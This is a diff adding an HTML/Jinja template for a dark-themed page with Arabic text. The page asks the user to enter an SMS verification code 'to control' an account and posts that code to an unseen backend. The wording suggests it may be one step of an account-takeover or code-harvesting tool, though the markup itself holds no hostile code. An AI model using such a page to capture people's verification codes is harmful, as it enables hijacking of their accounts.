@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head id="Head-Page">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/static/file/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn-uicons.flaticon.com/uicons-regular-rounded/css/uicons-regular-rounded.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn-uicons.flaticon.com/uicons-regular-straight/css/uicons-regular-straight.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs"
+      type="module"
+    ></script>
+    <title>Engine</title>
+  </head>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      color: #fff;
+      font-family: "Tajawal", sans-serif;
+      font-size: 17px;
+    }
+
+    html {
+      width: 100%;
+      height: 100%;
+    }
+
+    body,
+    #page-screen {
+      display: block;
+      width: 100%;
+      height: 100%;
+      align-items: start;
+      overflow: auto;
+      background-color: #111;
+    }
+    input::placeholder {
+      color: var(--placeholder-color, gray);
+    }
+
+    input:focus {
+      outline: none;
+    }
+  </style>
+  <body>
+    <div class="page-screen isDrop" id="page-screen">
+      <div
+        class=""
+        data-type="box"
+        style="
+          border-style: solid;
+          border-color: rgb(68, 68, 68);
+          border-width: 0px;
+          padding: 10px;
+          width: 100%;
+          height: 100%;
+          flex-flow: column;
+          justify-content: flex-start;
+          align-items: center;
+          gap: 0px;
+          text-align: center;
+          display: flex;
+        "
+      >
+        <div
+          class=""
+          data-type="box"
+          style="
+            display: flex;
+            border-style: solid;
+            border-color: rgb(115, 0, 255);
+            border-width: 0px;
+            padding: 3px;
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+            background-color: transparent;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            color: initial;
+            margin-top: 80px;
+          "
+        >
+          <div
+            class=""
+            data-type="box"
+            style="
+              display: flex;
+              border-style: solid;
+              border-color: rgb(68, 68, 68);
+              border-width: 0px;
+              padding: 10px;
+              width: auto;
+              height: auto;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              gap: 10px;
+            "
+          >
+            <dotlottie-player
+              src="https://lottie.host/c6fea3e3-b56a-497c-a6b9-a9b93bc12c88/XUHLi7y0cg.lottie"
+              background="transparent"
+              speed="1"
+              style="width: 120px; height: 120px"
+              loop
+              autoplay
+            ></dotlottie-player>
+            <span
+              class=""
+              data-type="text"
+              style="color: rgb(255, 255, 255); font-weight: bold; font-size: 13px"
+              >صفحة تسجيل الدحول الى حساب للتحكم فيه
+            </span>
+            <span
+              class=""
+              data-type="text"
+              style="
+                color: rgb(255, 255, 255);
+                font-size: 12px;
+                font-weight: 800;
+                font-style: inherit;
+              "
+              >يرجى أدخال الكود المرسل
+            </span>
+          </div>
+          <form method="POST">
+          <div
+            class=""
+            data-type="box"
+            style="
+              display: flex;
+              border-style: solid;
+              border-color: rgb(115, 0, 255);
+              border-width: 2px;
+              padding: 0px 5px;
+              width: 100%;
+              height: auto;
+              flex-direction: row;
+              justify-content: center;
+              align-items: center;
+              direction: rtl;
+              gap: 13px;
+              border-radius: 10px;
+            "
+          >
+            <input
+            required
+              class=""
+              name="code"
+              data-type="inputText"
+              type="number"
+              style="
+                outline: none;
+                color: rgb(255, 255, 255);
+                background-color: transparent;
+                border-width: 0px;
+                border-color: rgb(115, 0, 255);
+                border-radius: 5px;
+                padding: 8px;
+                width: 90%;
+                direction: ltr;
+                border-style: solid;
+                font-weight: bold;
+                text-align: center;
+                --placeholder-color: #aaa;
+              "
+              placeholder="000000"
+            />
+            <span
+              class="fi fi-rr-message-sms"
+              data-type="text"
+              style="
+                color: rgb(115, 0, 255);
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                font-size: 24px;
+                display: flex;
+                gap: 7px;
+              "
+            >
+            </span>
+          </div>
+        </div>
+        <button
+          class=""
+          data-type="box"
+          style="
+            display: flex;
+            border-style: solid;
+            border-color: rgb(17, 17, 17);
+            border-width: 1px;
+            padding: 10px;
+            width: 90%;
+            height: auto;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            background-color: rgb(115, 0, 255);
+            border-radius: 12px;
+            margin-top: 7px;
+          "
+        >
+          <span
+            class="fi fi-rr-enter"
+            data-type="text"
+            style="
+              color: rgb(255, 255, 255);
+              display: flex;
+              text-align: center;
+              font-weight: bold;
+              font-size: 20px;
+            "
+          >
+          </span>
+          <span
+            class=""
+            data-type="text"
+            style="
+              color: rgb(255, 255, 255);
+              font-weight: bold;
+              font-size: 18px;
+            "
+            >تحقق من الكود
+          </span>
+        </button>
+        </form>
+        {% if iserror %}
+        <span
+          class="fi fi-rr-exclamation"
+          data-type="text"
+          style="
+            color: rgb(255, 0, 0);
+            font-weight: bold;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            display: flex;
+            gap: 5px;
+            font-size: 15px;
+            margin-top: 10px;
+          "
+          >{{text}}
+        </span>
+        {% endif %}
+      </div>
+    </div>
+  </body>
+</html>
